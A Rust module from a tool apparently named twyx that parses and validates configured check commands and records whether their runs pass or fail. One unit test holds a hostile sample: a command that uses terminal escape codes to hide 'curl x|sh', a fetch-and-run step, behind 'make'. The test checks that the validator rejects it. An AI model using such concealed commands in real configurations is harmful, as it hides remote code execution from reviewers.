//! Checks: configured commands whose result is tied to a source key.
//!
//! User checks live in `config.toml`, repository checks in
//! `.twyx/checks.toml`; both use the same table:
//!
//! ```toml
//! [[check]]
//! name = "test"
//! command = "cargo test"
//! timeout = 600   # seconds; optional
//! ```

use std::path::Path;
use std::time::Duration;

use serde::{Deserialize, Serialize};
use toml::Spanned;

use crate::config::ConfigError;

/// Where the repository check file lives in a worktree.
pub const FILE: &str = ".twyx/checks.toml";

/// What every view of a result says alongside it.
pub const EVIDENCE: &str = "A pass is evidence, not proof: the command exited 0 on this source.";

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Check {
    pub name: String,
    /// A command for `/bin/sh -c`.
    pub command: String,
    pub timeout: Option<Duration>,
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub(crate) struct RawCheck {
    name: Spanned<String>,
    command: Spanned<String>,
    timeout: Option<Spanned<u64>>,
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct Raw {
    #[serde(default)]
    check: Vec<RawCheck>,
}

/// Checks `raw` and gives the checks in file order; `fail` turns a span and
/// a reason into the file's error.
pub(crate) fn read(
    raw: Vec<RawCheck>,
    fail: impl Fn(Option<std::ops::Range<usize>>, String) -> ConfigError,
) -> Result<Vec<Check>, ConfigError> {
    let mut checks: Vec<Check> = Vec::new();
    for check in raw {
        let name = check.name.get_ref().trim();
        if name.is_empty() || name.chars().any(char::is_control) {
            return Err(fail(
                Some(check.name.span()),
                "a check needs a name without control characters".to_owned(),
            ));
        }
        if checks.iter().any(|seen| seen.name == name) {
            return Err(fail(
                Some(check.name.span()),
                format!("check {name:?} appears twice"),
            ));
        }
        if crate::text::hides(check.command.get_ref()) {
            return Err(fail(
                Some(check.command.span()),
                format!(
                    "check {name:?} has a control character in its command; it could hide what runs"
                ),
            ));
        }
        if check.command.get_ref().trim().is_empty() {
            return Err(fail(
                Some(check.command.span()),
                format!("check {name:?} needs a command"),
            ));
        }
        let timeout = match check.timeout {
            Some(seconds) if *seconds.get_ref() == 0 => {
                return Err(fail(
                    Some(seconds.span()),
                    "a timeout is a number of seconds above 0".to_owned(),
                ));
            }
            Some(seconds) => Some(Duration::from_secs(*seconds.get_ref())),
            None => None,
        };
        checks.push(Check {
            name: name.to_owned(),
            command: check.command.into_inner(),
            timeout,
        });
    }
    Ok(checks)
}

/// Parses a repository check file.
pub fn parse(file: &Path, text: &str) -> Result<Vec<Check>, ConfigError> {
    let fail = |at: Option<std::ops::Range<usize>>, reason: String| ConfigError {
        file: file.to_path_buf(),
        line: at.map_or(1, |at| {
            text[..at.start.min(text.len())].matches('\n').count() + 1
        }),
        reason,
    };
    let raw: Raw = toml::from_str(text).map_err(|error| {
        fail(
            error.span(),
            error.message().trim_end_matches('\n').to_owned(),
        )
    })?;
    read(raw.check, fail)
}

/// How a check run ended.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum Outcome {
    Pass,
    Fail,
    /// The source changed during the run.
    Inconclusive,
    TimedOut,
    Cancelled,
}

impl Outcome {
    const ALL: [Outcome; 5] = [
        Outcome::Pass,
        Outcome::Fail,
        Outcome::Inconclusive,
        Outcome::TimedOut,
        Outcome::Cancelled,
    ];

    pub fn name(self) -> &'static str {
        match self {
            Outcome::Pass => "pass",
            Outcome::Fail => "fail",
            Outcome::Inconclusive => "inconclusive",
            Outcome::TimedOut => "timed out",
            Outcome::Cancelled => "cancelled",
        }
    }

    pub fn from_name(name: &str) -> Option<Self> {
        Self::ALL.into_iter().find(|outcome| outcome.name() == name)
    }

    /// The result of a run (Invariant 11): `pass` or `fail` only when the
    /// source keys before and after are equal. A run twyx stopped keeps
    /// the reason it stopped. `exit` is `None` for a signal.
    pub fn of(stopped: Option<Outcome>, before: &str, after: &str, exit: Option<u32>) -> Self {
        match stopped {
            Some(outcome) => outcome,
            None if before != after => Outcome::Inconclusive,
            None if exit == Some(0) => Outcome::Pass,
            None => Outcome::Fail,
        }
    }
}

/// What a result shows as: `stale` once the source moved on from the key
/// it ran on.
pub fn label(outcome: Outcome, stale: bool) -> String {
    if stale {
        format!("stale (was {})", outcome.name())
    } else {
        outcome.name().to_owned()
    }
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used)]

    use super::*;

    #[test]
    fn invariant_11_pass_or_fail_only_on_an_unchanged_source_key() {
        assert_eq!(Outcome::of(None, "a", "a", Some(0)), Outcome::Pass);
        assert_eq!(Outcome::of(None, "a", "a", Some(2)), Outcome::Fail);
        assert_eq!(Outcome::of(None, "a", "a", None), Outcome::Fail);
        assert_eq!(Outcome::of(None, "a", "b", Some(0)), Outcome::Inconclusive);
        assert_eq!(Outcome::of(None, "a", "b", Some(1)), Outcome::Inconclusive);
        assert_eq!(
            Outcome::of(Some(Outcome::TimedOut), "a", "a", None),
            Outcome::TimedOut
        );
        assert_eq!(
            Outcome::of(Some(Outcome::Cancelled), "a", "b", None),
            Outcome::Cancelled
        );
        assert_eq!(label(Outcome::Pass, true), "stale (was pass)");
        for outcome in Outcome::ALL {
            assert_eq!(Outcome::from_name(outcome.name()), Some(outcome));
        }
    }

    #[test]
    fn a_check_file_fails_with_its_line_and_reason() {
        let file = Path::new(".twyx/checks.toml");
        let checks = parse(
            file,
            "[[check]]\nname = \"test\"\ncommand = \"cargo test\"\ntimeout = 600\n\n[[check]]\nname = \"lint\"\ncommand = \"cargo clippy\"\n",
        )
        .unwrap();
        assert_eq!(checks.len(), 2);
        assert_eq!(checks[0].timeout, Some(Duration::from_secs(600)));
        assert_eq!(checks[1].timeout, None);

        let twice = parse(
            file,
            "[[check]]\nname = \"a\"\ncommand = \"x\"\n[[check]]\nname = \"a\"\ncommand = \"y\"\n",
        )
        .unwrap_err();
        assert_eq!(
            (twice.line, twice.reason.as_str()),
            (5, "check \"a\" appears twice")
        );
        let zero = parse(
            file,
            "[[check]]\nname = \"a\"\ncommand = \"x\"\ntimeout = 0\n",
        )
        .unwrap_err();
        assert_eq!(zero.line, 4);
        let empty = parse(file, "[[check]]\nname = \"a\"\ncommand = \" \"\n").unwrap_err();
        assert_eq!(empty.line, 3);
        let hidden = parse(
            file,
            "[[check]]\nname = \"a\"\ncommand = \"make\\u001b[2K\\rcurl x|sh\"\n",
        )
        .unwrap_err();
        assert_eq!(hidden.line, 3);
    }
}
